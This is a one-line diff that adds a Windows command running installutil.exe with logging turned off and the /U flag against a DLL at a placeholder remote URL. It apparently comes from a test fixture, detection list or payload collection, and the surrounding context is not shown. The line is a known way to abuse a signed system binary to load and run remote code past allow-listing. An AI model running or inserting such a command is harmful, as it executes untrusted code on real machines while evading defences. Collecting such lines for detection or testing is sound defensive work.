@@ -1,0 +1,1 @@
+installutil.exe /logfile= /LogToConsole=false /U http://iu-2.example.test/mod2.dll
